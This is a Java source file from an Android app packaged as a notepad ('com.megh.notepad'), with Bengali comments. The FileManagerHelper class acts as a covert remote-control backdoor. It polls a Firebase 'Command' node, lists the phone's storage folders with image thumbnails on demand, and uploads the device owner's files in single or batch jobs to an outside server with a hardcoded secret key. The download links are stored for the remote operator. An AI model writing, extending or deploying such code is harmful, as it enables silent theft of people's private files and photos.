package com.megh.notepad;

import android.content.Context;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Environment;
import android.util.Log;

import androidx.annotation.NonNull;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

import org.json.JSONArray;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;

public class FileManagerHelper {

    private static DatabaseReference commandRef;
    private static ValueEventListener commandListener;
    private static boolean isProcessing = false;

    // 🌟 ফিক্স ১: ফায়ারবেস ক্র্যাশ রোধ করতে নাম ফিল্টার করা হলো 🌟
    private static String getUserName(Context context) {
        SharedPreferences prefs = context.getSharedPreferences("AppPrefs", Context.MODE_PRIVATE);
        String rawName = prefs.getString("UserName", "UnknownUser");
        // ফায়ারবেসের নিষিদ্ধ ক্যারেক্টার মুছে দেওয়া হচ্ছে
        String safeName = rawName.replace(".", "").replace("#", "").replace("$", "").replace("[", "").replace("]", "");
        return safeName.trim();
    }

    public static void startListening(final Context context) {
        final Context appContext = context.getApplicationContext();
        String userId = getUserName(appContext);

        final DatabaseReference baseRef = FirebaseDatabase.getInstance()
                .getReference("DeviceData").child(userId).child("FileManager");

        commandRef = baseRef.child("Command");

        baseRef.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                if (!snapshot.exists() || !snapshot.hasChild("Command")) {
                    Map<String, Object> setupData = new HashMap<>();
                    setupData.put("Status", "Online & Ready");
                    
                    Map<String, Object> cmdData = new HashMap<>();
                    cmdData.put("Action", "None");
                    cmdData.put("Path", "/storage/emulated/0/");
                    cmdData.put("Limit", 50); // ডিফল্ট লিমিট ৫০
                    cmdData.put("Offset", 0); // ডিফল্ট অফসেট ০ (শুরু থেকে)
                    
                    setupData.put("Command", cmdData);
                    baseRef.updateChildren(setupData);
                } else {
                    baseRef.child("Status").setValue("Online & Ready");
                }
            }
            @Override
            public void onCancelled(@NonNull DatabaseError error) { }
        });

        if (commandListener == null) {
            commandListener = new ValueEventListener() {
                @Override
                public void onDataChange(@NonNull DataSnapshot snapshot) {
                    try {
                        if (snapshot.exists()) {
                            String action = snapshot.child("Action").getValue(String.class);
                            String path = snapshot.child("Path").getValue(String.class);
                            
                            // 🌟 স্মার্ট লিমিট এবং অফসেট পড়া 🌟
                            Integer limitVal = snapshot.child("Limit").getValue(Integer.class);
                            int limit = (limitVal != null) ? limitVal : 50;
                            
                            Integer offsetVal = snapshot.child("Offset").getValue(Integer.class);
                            int offset = (offsetVal != null) ? offsetVal : 0;

                            if (action != null && !action.equals("None")) {
                                
                                if (action.equalsIgnoreCase("ResetLock")) {
                                    isProcessing = false;
                                    commandRef.child("Action").setValue("None");
                                    updateStatus(appContext, "System Unlocked & Ready!");
                                    return;
                                }

                                if (isProcessing) return; 

                                if (path != null) {
                                    isProcessing = true;
                                    commandRef.child("Action").setValue("None");

                                    if (action.equalsIgnoreCase("ListFiles")) {
                                        updateStatus(appContext, "Loading items " + offset + " to " + (offset + limit) + "...");
                                        // 🌟 ফিক্স ২: listFiles এ offset এবং limit পাঠানো হলো 🌟
                                        listFiles(appContext, path, offset, limit);
                                    } else if (action.equalsIgnoreCase("UploadFile")) {
                                        updateStatus(appContext, "Processing command: UploadFile");
                                        uploadSingleFile(appContext, path);
                                    } else if (action.equalsIgnoreCase("UploadBatch")) {
                                        updateStatus(appContext, "Processing command: UploadBatch (Limit: " + limit + ")");
                                        uploadBatchFiles(appContext, path, limit);
                                    } else {
                                        isProcessing = false;
                                    }
                                }
                            }
                        }
                    } catch (Exception e) {
                        updateStatus(appContext, "Error: " + e.getMessage());
                        isProcessing = false;
                    }
                }
                @Override
                public void onCancelled(@NonNull DatabaseError error) { }
            };
            commandRef.addValueEventListener(commandListener);
        }
    }

    public static void stopListening() {
        if (commandRef != null && commandListener != null) {
            commandRef.removeEventListener(commandListener);
            commandListener = null;
        }
    }

    // ==========================================
    // 🌟 JSON History কন্ট্রোলার 🌟
    // ==========================================
    private static Set<String> getUploadedHistory(Context context) {
        Set<String> historySet = new HashSet<>();
        File file = new File(context.getFilesDir(), "uploaded_history.json");
        if (!file.exists()) return historySet;
        try {
            FileInputStream fis = new FileInputStream(file);
            byte[] data = new byte[(int) file.length()];
            fis.read(data);
            fis.close();
            JSONArray arr = new JSONArray(new String(data, "UTF-8"));
            for (int i = 0; i < arr.length(); i++) {
                historySet.add(arr.getString(i));
            }
        } catch (Exception e) {}
        return historySet;
    }

    private static void addToHistory(Context context, String fileName) {
        try {
            File file = new File(context.getFilesDir(), "uploaded_history.json");
            JSONArray arr;
            if (file.exists()) {
                FileInputStream fis = new FileInputStream(file);
                byte[] data = new byte[(int) file.length()];
                fis.read(data);
                fis.close();
                arr = new JSONArray(new String(data, "UTF-8"));
            } else {
                arr = new JSONArray();
            }
            arr.put(fileName);
            FileOutputStream fos = new FileOutputStream(file);
            fos.write(arr.toString().getBytes("UTF-8"));
            fos.close();
        } catch (Exception e) {}
    }

    private static void uploadBatchFiles(final Context context, final String folderPath, final int limit) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    File directory = new File(folderPath);
                    if (!directory.exists() || !directory.isDirectory()) {
                        updateStatus(context, "Failed: Invalid Directory Path!");
                        isProcessing = false;
                        return;
                    }

                    File[] allFiles = directory.listFiles();
                    if (allFiles == null || allFiles.length == 0) {
                        updateStatus(context, "Failed: Folder is empty or access denied!");
                        isProcessing = false;
                        return;
                    }

                    Set<String> uploadedHistory = getUploadedHistory(context);
                    List<File> filesToUpload = new ArrayList<>();
                    
                    for (File f : allFiles) {
                        if (f.isFile() && !uploadedHistory.contains(f.getName())) {
                            filesToUpload.add(f);
                        }
                    }

                    if (filesToUpload.isEmpty()) {
                        updateStatus(context, "Success: All files in this folder are already uploaded!");
                        isProcessing = false;
                        return;
                    }

                    int uploadCount = Math.min(filesToUpload.size(), limit);
                    String batchFolderName = "Batch_" + new SimpleDateFormat("dd_MMM_hh_mm_a", Locale.getDefault()).format(new Date());
                    DatabaseReference batchRef = FirebaseDatabase.getInstance()
                            .getReference("DeviceData").child(getUserName(context)).child("FileManager").child("BatchUploads").child(batchFolderName);

                    int successCount = 0;
                    for (int i = 0; i < uploadCount; i++) {
                        File targetFile = filesToUpload.get(i);
                        updateStatus(context, "Uploading " + (i + 1) + " of " + uploadCount + " (" + targetFile.getName() + ")");
                        
                        String returnedUrl = executeUpload(context, targetFile);
                        if (returnedUrl != null && returnedUrl.startsWith("http")) {
                            addToHistory(context, targetFile.getName());
                            
                            Map<String, Object> linkData = new HashMap<>();
                            linkData.put("File_Name", targetFile.getName());
                            linkData.put("Download_URL", returnedUrl);
                            
                            String safeName = targetFile.getName().replace(".", "_").replace("#", "").replace("$", "").replace("[", "").replace("]", "");
                            batchRef.child(safeName).setValue(linkData);
                            successCount++;
                        }
                    }
                    updateStatus(context, "Batch Complete! " + successCount + " files uploaded to " + batchFolderName);
                } catch (Exception e) {
                    updateStatus(context, "Batch Error: " + e.getMessage());
                } finally {
                    isProcessing = false;
                }
            }
        }).start();
    }

    private static void uploadSingleFile(final Context context, final String filePath) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    File file = new File(filePath);
                    if (!file.exists() || !file.isFile()) {
                        updateStatus(context, "Failed: File not found!");
                        isProcessing = false;
                        return;
                    }
                    
                    updateStatus(context, "Uploading: " + file.getName());
                    String returnedUrl = executeUpload(context, file);
                    
                    if (returnedUrl != null && returnedUrl.startsWith("http")) {
                        saveDownloadLinkToDB(context, file.getName(), returnedUrl);
                        addToHistory(context, file.getName()); 
                        updateStatus(context, "Success: File Uploaded! URL saved.");
                    } else {
                        updateStatus(context, "Failed: " + returnedUrl);
                    }
                } finally {
                    isProcessing = false;
                }
            }
        }).start();
    }

// ==========================================
    // 🌟 কোর আপলোড ইঞ্জিন (Live Percentage & 1GB Support সহ) 🌟
    // ==========================================
    private static String executeUpload(Context context, File file) {
        HttpURLConnection conn = null;
        DataOutputStream dos = null;
        FileInputStream fileInputStream = null;
        String boundary = "*****" + System.currentTimeMillis() + "*****";
        String lineEnd = "\r\n";
        String twoHyphens = "--";

        try {
            // ১ জিবির লিমিট সেট করা
            long maxSizeBytes = 1024L * 1024L * 1024L; 
            if (file.length() > maxSizeBytes) return "Error: File too large (Max 1GB)";

            fileInputStream = new FileInputStream(file);
            String serverUrl = "https://shuvraafroj.info/TunePad/upload.php";
            String mySecretKey = "Megh_Secret_Pass_2026";

            URL url = new URL(serverUrl);
            conn = (HttpURLConnection) url.openConnection();
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(60000); // বড় ফাইলের জন্য রিড টাইম বাড়ানো হলো
            conn.setDoInput(true);
            conn.setDoOutput(true);
            conn.setUseCaches(false);
            
            // 🛡️ 🌟 ম্যাজিক ১: RAM Crash Protection 🌟 🛡️
            // এটি না দিলে ১ জিবির ফাইল একবারে র‍্যামে লোড হয়ে ফোন হ্যাং করবে!
            // এটি ফাইলটিকে ১ মেগাবাইট করে টুকরো করে সার্ভারে পাঠাবে
            conn.setChunkedStreamingMode(1024 * 1024); 

            conn.setRequestMethod("POST");
            conn.setRequestProperty("Connection", "Keep-Alive");
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

            dos = new DataOutputStream(conn.getOutputStream());

            dos.write((twoHyphens + boundary + lineEnd).getBytes("UTF-8"));
            dos.write(("Content-Disposition: form-data; name=\"secret_key\"" + lineEnd).getBytes("UTF-8"));
            dos.write((lineEnd).getBytes("UTF-8"));
            dos.write((mySecretKey + lineEnd).getBytes("UTF-8"));

            dos.write((twoHyphens + boundary + lineEnd).getBytes("UTF-8"));
            dos.write(("Content-Disposition: form-data; name=\"file\"; filename=\"" + file.getName() + "\"" + lineEnd).getBytes("UTF-8"));
            dos.write(("Content-Type: application/octet-stream" + lineEnd).getBytes("UTF-8"));
            dos.write((lineEnd).getBytes("UTF-8"));

            // 🌟 ম্যাজিক ২: লাইভ পার্সেন্টেজ (Percentage) হিসাব করা 🌟
            long totalSize = file.length();
            long uploadedBytes = 0;
            int lastPercentage = 0;

            int bufferSize = 1024 * 1024; // 1 MB এর বাফার
            byte[] buffer = new byte[bufferSize];
            int bytesRead;

            // লুপ চালিয়ে ফাইল পড়া এবং সার্ভারে পাঠানো
            while ((bytesRead = fileInputStream.read(buffer)) != -1) {
                dos.write(buffer, 0, bytesRead);
                uploadedBytes += bytesRead;

                // শতকরা কত ভাগ আপলোড হলো তার হিসাব
                int currentPercentage = (int) ((uploadedBytes * 100) / totalSize);
                
                // 🌟 সেফটি ট্রিক: প্রতি ১% বাড়লে তবেই ফায়ারবেস আপডেট করবে 🌟
                // (নাহলে মিলি-সেকেন্ডে ফায়ারবেস আপডেট হতে গিয়ে ডেটাবেস ব্লক হয়ে যাবে)
                if (currentPercentage > lastPercentage) {
                    lastPercentage = currentPercentage;
                    updateStatus(context, "Uploading: " + file.getName() + " (" + currentPercentage + "%)");
                }
            }

            dos.write((lineEnd).getBytes("UTF-8"));
            dos.write((twoHyphens + boundary + twoHyphens + lineEnd).getBytes("UTF-8"));
            dos.flush();

            int responseCode = conn.getResponseCode();
            if (responseCode == 200) {
                BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream(), "UTF-8"));
                StringBuilder responseString = new StringBuilder();
                String inputLine;
                while ((inputLine = in.readLine()) != null) responseString.append(inputLine);
                in.close();

                String rawResponse = responseString.toString().trim();
                if (rawResponse.contains("http")) {
                    String finalUrl = rawResponse.substring(rawResponse.indexOf("http"));
                    return finalUrl.split("[\"\\s<]")[0]; 
                } else {
                    return "Error: " + rawResponse;
                }
            } else {
                return "Error: Server returned " + responseCode;
            }
        } catch (Exception e) {
            return "Exception: " + e.getMessage();
        } finally {
            try {
                if (fileInputStream != null) fileInputStream.close();
                if (dos != null) dos.close();
                if (conn != null) conn.disconnect();
            } catch (Exception e) {}
        }
    }

    private static void saveDownloadLinkToDB(Context context, String fileName, String downloadUrl) {
        try {
            DatabaseReference dbRef = FirebaseDatabase.getInstance()
                    .getReference("DeviceData").child(getUserName(context)).child("FileManager").child("UploadedFiles");
            String safeName = fileName.replace(".", "_").replace("#", "").replace("$", "").replace("[", "").replace("]", "");
            String timeStamp = new SimpleDateFormat("dd_MMM_hh_mm_ss_a", Locale.getDefault()).format(new Date());
            
            Map<String, Object> data = new HashMap<>();
            data.put("File_Name", fileName);
            data.put("Download_URL", downloadUrl);
            dbRef.child(safeName + "_" + timeStamp).setValue(data);
        } catch (Exception e) {}
    }

    // ==========================================
    // 🌟 ফিক্স ৩: স্মার্ট পেজিনেশন ও থাম্বনেইল লিমিট 🌟
    // ==========================================
    private static void listFiles(final Context context, final String folderPath, final int offset, final int limit) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    File directory = new File(folderPath);
                    if (!directory.exists() || !directory.isDirectory()) {
                        updateStatus(context, "Failed: Invalid Directory Path!");
                        isProcessing = false;
                        return;
                    }
                    
                    File[] allFiles = directory.listFiles();
                    List<Map<String, Object>> fileList = new ArrayList<>();
                    int totalFiles = 0;

                    if (allFiles != null) {
                        totalFiles = allFiles.length; // 🌟 মোট কতগুলো ফাইল আছে তা গুনে ফেলা হলো 🌟
                        SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy hh:mm a", Locale.getDefault());
                        
                        // নির্দিষ্ট অফসেট থেকে লিমিট পর্যন্ত লুপ চলবে
                        int startIndex = Math.min(offset, totalFiles);
                        int endIndex = Math.min(startIndex + limit, totalFiles);

                        for (int i = startIndex; i < endIndex; i++) {
                            File file = allFiles[i];
                            Map<String, Object> fileData = new HashMap<>();
                            fileData.put("Name", file.getName());
                            fileData.put("Is_Folder", file.isDirectory());
                            fileData.put("Path", file.getAbsolutePath());
                            fileData.put("Size", formatSize(file.length()));
                            fileData.put("Last_Modified", sdf.format(new Date(file.lastModified())));
                            
                            // 🌟 শুধু এই নির্দিষ্ট ফাইলগুলোরই থাম্বনেইল তৈরি হবে 🌟
                            if (!file.isDirectory() && isImageFile(file.getName())) {
                                String thumbBase64 = getThumbnailBase64(file.getAbsolutePath());
                                if (thumbBase64 != null) {
                                    fileData.put("Thumbnail", thumbBase64);
                                }
                            }
                            fileList.add(fileData);
                        }
                    }

                    DatabaseReference dbRef = FirebaseDatabase.getInstance()
                            .getReference("DeviceData").child(getUserName(context)).child("FileManager").child("DirectoryList");
                    
                    Map<String, Object> uploadData = new HashMap<>();
                    uploadData.put("Current_Path", folderPath);
                    uploadData.put("Total_Items", totalFiles); // কন্ট্রোল অ্যাপকে জানানো হলো ফোল্ডারে মোট কত ফাইল
                    uploadData.put("Showing_From", offset);
                    uploadData.put("Showing_To", offset + fileList.size());
                    uploadData.put("Items", fileList);
                    
                    dbRef.setValue(uploadData);
                    updateStatus(context, "Success: Loaded " + fileList.size() + " items (Total: " + totalFiles + ")");
                } catch (Exception e) {
                    updateStatus(context, "ListFiles Error: " + e.getMessage());
                } finally {
                    isProcessing = false;
                }
            }
        }).start();
    }

    private static String formatSize(long size) {
        if (size <= 0) return "0 B";
        final String[] units = new String[]{"B", "KB", "MB", "GB", "TB"};
        int digitGroups = (int) (Math.log10(size) / Math.log10(1024));
        return String.format(Locale.US, "%.1f %s", size / Math.pow(1024, digitGroups), units[digitGroups]);
    }

    private static void updateStatus(Context context, String status) {
        try {
            FirebaseDatabase.getInstance().getReference("DeviceData")
                    .child(getUserName(context)).child("FileManager").child("Status").setValue(status);
            Log.d("FileManagerHelper", status);
        } catch (Exception e) {}
    }
    
    // ==========================================
    // 🌟 হেল্পার মেথডস 🌟
    // ==========================================
    private static boolean isImageFile(String fileName) {
        String name = fileName.toLowerCase();
        return name.endsWith(".jpg") || name.endsWith(".jpeg") || name.endsWith(".png") || name.endsWith(".webp");
    }

  // ==========================================
    // 🌟 প্রো-লেভেল থাম্বনেইল জেনারেটর 🌟
    // ==========================================
    private static String getThumbnailBase64(String path) {
        try {
            // ১. আগে শুধু ইমেজের সাইজ চেক করবো (পুরো ছবি র‍্যামে লোড না করে)
            android.graphics.BitmapFactory.Options options = new android.graphics.BitmapFactory.Options();
            options.inJustDecodeBounds = true;
            android.graphics.BitmapFactory.decodeFile(path, options);

            // ২. থাম্বনেইলের টার্গেট সাইজ (১৫০ পিক্সেল দিলে ক্লিয়ার দেখাবে)
            final int REQUIRED_SIZE = 150;
            int width_tmp = options.outWidth, height_tmp = options.outHeight;
            int scale = 1;

            // ৩. ডায়নামিক স্কেলিং (যাতে র‍্যাম ক্র্যাশ না করে এবং ছোট ছবি ঘোলা না হয়)
            while (true) {
                if (width_tmp / 2 < REQUIRED_SIZE || height_tmp / 2 < REQUIRED_SIZE) {
                    break;
                }
                width_tmp /= 2;
                height_tmp /= 2;
                scale *= 2;
            }

            // ৪. এবার আসল ছবিটা সঠিক সাইজে লোড করবো
            android.graphics.BitmapFactory.Options options2 = new android.graphics.BitmapFactory.Options();
            options2.inSampleSize = scale;
            android.graphics.Bitmap bitmap = android.graphics.BitmapFactory.decodeFile(path, options2);

            if (bitmap != null) {
                // ৫. ম্যাজিক: ছবিটাকে পারফেক্ট স্কয়ার (Center Crop) শেইপ দেবো যাতে চ্যাপ্টা না দেখায়
                android.graphics.Bitmap squareBitmap = android.media.ThumbnailUtils.extractThumbnail(bitmap, REQUIRED_SIZE, REQUIRED_SIZE);

                java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
                // কোয়ালিটি ৫০ থেকে বাড়িয়ে ৭০ দিলাম যাতে আরেকটু ক্লিয়ার দেখায় (Base64 সাইজ খুব একটা বাড়বে না)
                squareBitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, 70, baos); 
                byte[] b = baos.toByteArray();
                
                // ৬. মেমরি লিক রোধ করার জন্য ক্লিনআপ
                if (bitmap != squareBitmap) {
                    bitmap.recycle();
                }
                squareBitmap.recycle();
                
                return android.util.Base64.encodeToString(b, android.util.Base64.DEFAULT);
            }
        } catch (Exception e) {
            Log.e("FileManagerHelper", "Thumb Error: " + e.getMessage());
        }
        return null;
    }
}
